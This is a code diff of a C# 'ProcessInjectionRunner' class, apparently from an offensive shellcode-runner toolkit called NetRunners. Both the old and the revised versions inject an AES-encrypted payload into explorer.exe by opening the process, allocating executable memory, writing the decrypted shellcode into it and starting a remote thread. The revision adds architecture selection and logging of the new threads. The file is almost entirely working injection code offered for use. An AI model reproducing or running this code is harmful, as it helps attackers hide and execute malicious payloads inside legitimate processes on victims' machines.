@@ -1,80 +1,92 @@
-using System;
-using System.Runtime.InteropServices;
+﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+
 using NetRunners.Interfaces;
-using static NetRunners.Decryptors.AesDecryptor;
-using static NetRunners.Helpers.Helper;
 using static NetRunners.Delegates.Delegate;
+using static NetRunners.Helpers.Helper;
 using static NetRunners.Data.WinConstants;
+using static NetRunners.Decryptors.AesDecryptor;
 using static NetRunners.Data.EncryptedData;
 
 namespace NetRunners.Runners
 {
-    /// <summary>
-    /// This class contains the Process Injection Shellcode Runner
-    /// </summary>
     public class ProcessInjectionRunner : IRunner
     {
-        // Process Injection Runner
         public void Run()
         {
-            try
+            string techniqueName = "Process Injection";
+            string targetProcess = "explorer";                       // suffix needed
+            byte[] buf;
+            IntPtr hProcess = default;
+            Process[] targetPid = Process.GetProcessesByName(targetProcess);
+            int processID = 0;
+            bool IsRemote32BitProcess = false;
+
+            PrintTechniqueInfo(techniqueName, targetProcess);
+
+            foreach (Process process in targetPid)
             {
-                byte[] buf = GetPayload();
-                int sBuf = GetSize();
-                int explorerPID;
-                IntPtr hProcess;
-                IntPtr hThread;
-                IntPtr outSize;
-                IntPtr pRMemory;
-                Process[] explorerProcesses;
-
-                // now you know
-                Console.WriteLine("[+] Process Injection Shellcode Runner selected!");
-
-                // get explorer pid
-                explorerProcesses = Process.GetProcessesByName("explorer");
-                explorerPID = explorerProcesses[0].Id;
-                if (explorerPID == 0)
-                    throw new Exception($"Failed retrieving explorer's PID");
-                Console.WriteLine($"explorer pid: {explorerPID}");
-
-                // open handle to target process 
-                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (UInt32)explorerPID);
-                if (hProcess == IntPtr.Zero)
-                    throw new InvalidOperationException($"OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");
-                Console.WriteLine($"explorer process handle: {hProcess}");
-
-                // allocate memory on remote process
-                pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // TO-DO USE EXEC_READ, THEN CHANGE PROTECT WITH VIRTUALPROTECTEX
-                if (pRMemory == IntPtr.Zero)
-                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");
-
-                //decrypt buf
-                try
-                {
-                    buf = DecryptBytesToBytesAes(buf, AesKey);
-                }
-                catch (Exception e)
-                {
-                    throw new InvalidOperationException("Decryption of buffer failed.", e);
-                }
-
-                // write to remote process memory
-                WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
-                if (outSize == IntPtr.Zero)
-                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
-
-                // create remote thread to execute shellcode
-                hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
-                if (hThread == IntPtr.Zero)
-                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
+                //Open remote process
+                processID = process.Id;
+                hProcess = OpenProcess(0x001F0FFF, 0, (uint)process.Id);
+                IsWow64Process(hProcess,out IsRemote32BitProcess);
             }
-            catch (Exception e)
+
+            //Allocate space
+            int sBuf = SelectPayloadSize(IsRemote32BitProcess);
+            IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // to-do use exec_read then change protect with virtualprotect
+
+            var allocAddress = string.Format("{0:X}", pRMemory); // Pointer -> String
+            UInt64 number = UInt64.Parse(allocAddress); // String -> Int
+            string allocAddressHex = number.ToString("x"); // Int -> Hex
+            Console.WriteLine("[+] Executable Memory Address (VirtualAllocEx) to remote processID-> "+processID+" on Mem.Address ->" + "0x"+allocAddressHex);
+
+            // select and decrypt payload
+            buf = SelectPayloadArchitecture();
+            buf = DecryptBytesToBytesAes(buf, AesKey);
+
+            unsafe
             {
-                // handle error
-                Console.WriteLine($"An error occurred: {e.Message}");
-                throw;
+                fixed (byte* p = &buf[0])
+                {
+                    byte* p2 = p;
+                    
+                    //Convert DEC->HEX
+                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
+                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
+                    string bufHex = bufInt.ToString("x"); //Integer -> Hex
+
+                    Console.WriteLine("[+] Payload Address on this executable: " + "0x"+bufHex);
+
+                }
+            }
+            IntPtr outSize;
+            
+            //Write to remote process
+            WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
+            Console.WriteLine("[+] Payload has been written to the buffer!");
+
+            //Enumerate the threads of the remote process before creating a new one.
+            List<int> threadList = new List<int>();
+            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
+            foreach (ProcessThread thread in threadsBefore)
+            {
+                threadList.Add(thread.Id);
+            }
+
+            //Create a remote thread and execute it
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
+
+            //Enumerate threads from the given process.
+            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
+            foreach(ProcessThread thread in threads)
+            {
+                if (!threadList.Contains(thread.Id))
+                {
+                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
+                }   
             }
         }
     }
